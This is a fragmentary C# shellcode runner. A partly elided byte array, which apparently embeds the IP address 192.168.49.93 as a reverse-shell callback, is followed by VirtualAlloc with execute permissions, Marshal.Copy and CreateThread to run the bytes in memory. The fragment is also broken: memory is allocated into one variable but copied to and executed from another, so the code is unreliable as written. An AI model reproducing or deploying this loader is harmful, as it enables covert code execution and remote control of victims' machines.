...
0xc0,0xa8,0x31,0x5d,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
...
0xd5};
            ...
            IntPtr ad = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, mem, size);

            IntPtr hT = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
